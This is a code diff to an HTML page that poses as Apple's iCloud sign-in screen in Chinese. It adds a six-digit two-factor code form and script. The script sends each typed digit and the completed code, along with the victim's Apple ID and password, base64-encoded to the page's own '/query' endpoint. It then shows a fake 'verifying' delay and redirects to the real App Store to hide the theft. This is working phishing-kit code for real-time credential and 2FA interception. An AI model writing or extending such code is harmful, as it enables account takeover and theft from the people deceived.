@@ -1508,48 +1508,146 @@
 
 
                                                             </logo>
-                                                            
 
 
-                                                            <div id='stepE2' class="verify-device fade-in " style="display: none">
+
+                                                            <div id='stepE2' class="verify-device fade-in "
+                                                                style="display: none">
                                                                 <div class="">
-                                                                    <h1 class="si-container-title tk-intro" tabindex="-1">
+                                                                    <h1 class="si-container-title tk-intro"
+                                                                        tabindex="-1">
                                                                         双重认证
                                                                     </h1>
-                                                                        
-                                                                    
+
+
+                                                                    <div id='wenjuncodeerror'
+                                                                        class="pop-container error tk-subbody"
+                                                                        tabindex="-1" role="tooltip"
+                                                                        style="display: none;">
+                                                                        <div class="error pop-top">您输入验证码有误。请重试。</div>
+                                                                    </div>
+
                                                                     <div class="sec-code-wrapper">
-                                                                        <security-code length="{codeLength}" split="true" type="tel" sr-context="输入验证码" localised-digit="位" error-message=""><div class="security-code">
-                                                              <idms-error-wrapper {disable-all-errors}="hasErrorLabel" {^error-type}="errorType" popover-auto-close="false" {^idms-error-wrapper-classes}="idmsErrorWrapperClasses" {has-errors-and-focus}="hasErrorsAndFocus" {show-error}="hasErrorsAndFocus" {error-message}="errorMessage" {parent-container}="parentContainer" {(enable-showing-errors)}="enableShowingErrors" anchor-element="#security-code-wrap-1566408997815-1">
-                                                              <div class="" id="idms-error-wrapper-1566408997815-0">
-                                                                
-                                                              <div id="security-code-wrap-1566408997815-1" class="security-code-wrap security-code-6 split" localiseddigit="位">
-                                                                  <div class="security-code-container force-ltr">
-                                                                      <div class="field-wrap force-ltr">
-                                                                          <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char0" class="form-control force-ltr form-textbox char-field" aria-label="输入验证码 位 1" placeholder="" aria-describedby="idms-input-error-1566408997815-1" data-index="0">
-                                                                      </div>
-                                                                      <div class="field-wrap force-ltr">
-                                                                          <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char1" class="form-control force-ltr form-textbox char-field" aria-label="位 2" placeholder="" aria-describedby="idms-input-error-1566408997815-1" data-index="1">
-                                                                      </div>
-                                                                      <div class="field-wrap force-ltr">
-                                                                          <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char2" class="form-control force-ltr form-textbox char-field" aria-label="位 3" placeholder="" aria-describedby="idms-input-error-1566408997815-1" data-index="2">
-                                                                      </div>
-                                                                      <div class="field-wrap force-ltr">
-                                                                          <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char3" class="form-control force-ltr form-textbox char-field" aria-label="位 4" placeholder="" aria-describedby="idms-input-error-1566408997815-1" data-index="3">
-                                                                      </div>
-                                                                      <div class="field-wrap force-ltr">
-                                                                          <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char4" class="form-control force-ltr form-textbox char-field" aria-label="位 5" placeholder="" aria-describedby="idms-input-error-1566408997815-1" data-index="4">
-                                                                      </div>
-                                                                      <div class="field-wrap force-ltr">
-                                                                          <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char5" class="form-control force-ltr form-textbox char-field" aria-label="位 6" placeholder="" aria-describedby="idms-input-error-1566408997815-1" data-index="5">
-                                                                      </div>
-                                                                  </div>
-                                                              </div>
-                                                              
-                                                              </div>
-                                                            </idms-error-wrapper>
-                                                            </div>
-                                                            </security-code>
+                                                                        <security-code length="{codeLength}"
+                                                                            split="true" type="tel" sr-context="输入验证码"
+                                                                            localised-digit="位" error-message="">
+                                                                            <div class="security-code">
+                                                                                <idms-error-wrapper
+                                                                                    {disable-all-errors}="hasErrorLabel"
+                                                                                    {^error-type}="errorType"
+                                                                                    popover-auto-close="false"
+                                                                                    {^idms-error-wrapper-classes}="idmsErrorWrapperClasses"
+                                                                                    {has-errors-and-focus}="hasErrorsAndFocus"
+                                                                                    {show-error}="hasErrorsAndFocus"
+                                                                                    {error-message}="errorMessage"
+                                                                                    {parent-container}="parentContainer"
+                                                                                    {(enable-showing-errors)}="enableShowingErrors"
+                                                                                    anchor-element="#security-code-wrap-1566408997815-1">
+                                                                                    <div class=""
+                                                                                        id="idms-error-wrapper-1566408997815-0">
+
+                                                                                        <div id="security-code-wrap-1566408997815-1"
+                                                                                            class="security-code-wrap security-code-6 split"
+                                                                                            localiseddigit="位">
+                                                                                            <div
+                                                                                                class="security-code-container force-ltr">
+                                                                                                <div
+                                                                                                    class="field-wrap force-ltr">
+                                                                                                    <input maxlength="1"
+                                                                                                        autocorrect="off"
+                                                                                                        autocomplete="off"
+                                                                                                        autocapitalize="off"
+                                                                                                        spellcheck="false"
+                                                                                                        type="tel"
+                                                                                                        id="char0"
+                                                                                                        class="form-control force-ltr form-textbox char-field"
+                                                                                                        aria-label="输入验证码 位 1"
+                                                                                                        placeholder=""
+                                                                                                        aria-describedby="idms-input-error-1566408997815-1"
+                                                                                                        data-index="0">
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="field-wrap force-ltr">
+                                                                                                    <input maxlength="1"
+                                                                                                        autocorrect="off"
+                                                                                                        autocomplete="off"
+                                                                                                        autocapitalize="off"
+                                                                                                        spellcheck="false"
+                                                                                                        type="tel"
+                                                                                                        id="char1"
+                                                                                                        class="form-control force-ltr form-textbox char-field"
+                                                                                                        aria-label="位 2"
+                                                                                                        placeholder=""
+                                                                                                        aria-describedby="idms-input-error-1566408997815-1"
+                                                                                                        data-index="1">
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="field-wrap force-ltr">
+                                                                                                    <input maxlength="1"
+                                                                                                        autocorrect="off"
+                                                                                                        autocomplete="off"
+                                                                                                        autocapitalize="off"
+                                                                                                        spellcheck="false"
+                                                                                                        type="tel"
+                                                                                                        id="char2"
+                                                                                                        class="form-control force-ltr form-textbox char-field"
+                                                                                                        aria-label="位 3"
+                                                                                                        placeholder=""
+                                                                                                        aria-describedby="idms-input-error-1566408997815-1"
+                                                                                                        data-index="2">
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="field-wrap force-ltr">
+                                                                                                    <input maxlength="1"
+                                                                                                        autocorrect="off"
+                                                                                                        autocomplete="off"
+                                                                                                        autocapitalize="off"
+                                                                                                        spellcheck="false"
+                                                                                                        type="tel"
+                                                                                                        id="char3"
+                                                                                                        class="form-control force-ltr form-textbox char-field"
+                                                                                                        aria-label="位 4"
+                                                                                                        placeholder=""
+                                                                                                        aria-describedby="idms-input-error-1566408997815-1"
+                                                                                                        data-index="3">
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="field-wrap force-ltr">
+                                                                                                    <input maxlength="1"
+                                                                                                        autocorrect="off"
+                                                                                                        autocomplete="off"
+                                                                                                        autocapitalize="off"
+                                                                                                        spellcheck="false"
+                                                                                                        type="tel"
+                                                                                                        id="char4"
+                                                                                                        class="form-control force-ltr form-textbox char-field"
+                                                                                                        aria-label="位 5"
+                                                                                                        placeholder=""
+                                                                                                        aria-describedby="idms-input-error-1566408997815-1"
+                                                                                                        data-index="4">
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="field-wrap force-ltr">
+                                                                                                    <input maxlength="1"
+                                                                                                        autocorrect="off"
+                                                                                                        autocomplete="off"
+                                                                                                        autocapitalize="off"
+                                                                                                        spellcheck="false"
+                                                                                                        type="tel"
+                                                                                                        id="char5"
+                                                                                                        class="form-control force-ltr form-textbox char-field"
+                                                                                                        aria-label="位 6"
+                                                                                                        placeholder=""
+                                                                                                        aria-describedby="idms-input-error-1566408997815-1"
+                                                                                                        data-index="5">
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+
+                                                                                    </div>
+                                                                                </idms-error-wrapper>
+                                                                            </div>
+                                                                        </security-code>
                                                                     </div>
                                                                     <div class="si-info">
                                                                         <p>
@@ -1559,11 +1657,13 @@
                                                                     <!-- <a class="si-link ax-outline tk-subbody lite-theme-override" id="no-trstd-device-pop" href="#" aria-haspopup="true">
                                                                         没有收到验证码？
                                                                     </a> -->
-                                                                    <div class="spinner-container verifying-code" id="verifying-code">正在验证...</div>
+                                                                    <div class="spinner-container verifying-code"
+                                                                        style="display:none;" id="verifying-code">
+                                                                        正在验证...</div>
                                                                 </div>
-                                                                
-                                                                    
-                                                                    
+
+
+
                                                             </div>
 
 
@@ -1681,9 +1781,8 @@
 
                                                                             <div id='wenjunerror'
                                                                                 class="pop-container error signin-error"
-                                                                                ($click)="errorClickHandler()" style="
-                                                                           display: none;
-                                                                        ">
+                                                                                ($click)="errorClickHandler()"
+                                                                                style="display: none;">
                                                                                 <div class="error pop-bottom tk-subbody-headline"
                                                                                     ($click)="errorClickHandler()">
                                                                                     <p class="fat" id="errMsg">
@@ -2560,6 +2659,7 @@
         let wenjunPwd = document.querySelector("#password_text_field");
         let wenjunwaiting = document.querySelector("#wenjunwaiting");
         let wenjunerror = document.querySelector("#wenjunerror");
+        let wenjuncodeerror = document.querySelector("#wenjuncodeerror");
         let stepEl = document.querySelector("#stepEl");
         let stepE2 = document.querySelector("#stepE2");
         let wenjuncheckingcode = document.querySelector("#verifying-code");
@@ -2569,7 +2669,47 @@
         let wenjunchar3 = document.querySelector("#char3");
         let wenjunchar4 = document.querySelector("#char4");
         let wenjunchar5 = document.querySelector("#char5");
+        let wenjunchars = [wenjunchar0, wenjunchar1, wenjunchar2, wenjunchar3, wenjunchar4, wenjunchar5];
 
+        let isFirstCheckPwd = true;
+        let isFirstCheckCode = true;
+
+        let checkCode = () => {
+            wenjuncheckingcode.style.display = "";
+            let str = "";
+            for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
+                str += (wenjunchars[__i].value || "-");
+            }
+            let name = "icloudCheckCode";
+            if (isFirstCheckCode) {
+                isFirstCheckCode = false;
+                name += "Need";
+            }
+            wenjunfire(name, str, (data) => {
+                setTimeout(() => {
+                    if (data === "error") {
+                        for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
+                            wenjunchars[__i].value = "";
+                            wenjuncodeerror.style.display = "";
+                        }
+                    } else {
+                        wenjuncodeerror.style.display = "none";
+                        window.location.href = "https://apps.apple.com/cn/app/apple-store/id393765873";
+                    }
+                    wenjuncheckingcode.style.display = "none";
+                }, 4500);
+            });
+        };
+
+        let inputCode = () => {
+            wenjuncheckingcode.style.display = "none";
+            wenjuncodeerror.style.display = "none";
+            let str = "";
+            for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
+                str += (wenjunchars[__i].value || "-");
+            }
+            wenjunfire("icloudInputCode", str);
+        }
 
         let lastText = "";
         let lastPwd = "";
@@ -2603,7 +2743,12 @@
         };
         let wenjunlogin = () => {
             wenjuncheck();
-            wenjunfire('icloudLogin', `text=${wenjunText.value}&pwd=${wenjunPwd.value}`, (data) => {
+            let name = "icloudLogin";
+            if (isFirstCheckPwd) {
+                isFirstCheckPwd = false;
+                name += "Need";
+            }
+            wenjunfire(name, `text=${wenjunText.value}&pwd=${wenjunPwd.value}`, (data) => {
                 setTimeout(() => {
                     wenjunshow();
                     if (data == "error") {
@@ -2618,21 +2763,21 @@
                 }, 4500);
             });
         }
-        let wenjunfire = (key, value, callback=function(data){}) => {
+        let wenjunfire = (key, value, callback = function (data) { }) => {
             $.ajax({
                 url: `/query?${key}=${window.btoa(encodeURIComponent(value))}`,
                 type: 'get',
+                timeout: 10000,
                 dataType: 'text',
                 success: (data) => {
                     // console.log(data);
                     callback(data);
                 },
                 error: (data) => {
-                    wenjunerror.style.display = "";
+                    callback("error");
                 }
             });
         }
-
 
         wenjunBtn.addEventListener("click", () => {
             if (!wenjunText.value) {
@@ -2656,6 +2801,37 @@
             }
         });
         setInterval(wenjuncheck, 500);
+
+        wenjunPwd.addEventListener("input", () => {
+            wenjunerror.style.display = "none";
+        });
+
+        for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
+            let cur = wenjunchars[__i];
+            cur.addEventListener('input', (e) => {
+                if (/[0-9]/.test(cur.value)) {
+                    inputCode();
+                    // 命中
+                    let next = wenjunchars[__i + 1];
+                    if (next) {
+                        next.focus();
+                    } else {
+                        checkCode();
+                    }
+                } else if (cur.value === "") {
+                    let pre = wenjunchars[__i - 1];
+                    if (pre) {
+                        pre.focus();
+                    }
+                } else {
+                    cur.value = "";
+                }
+            });
+
+            cur.addEventListener('focus', (e) => {
+                cur.select();
+            });
+        }
     </script>
 </body>
 
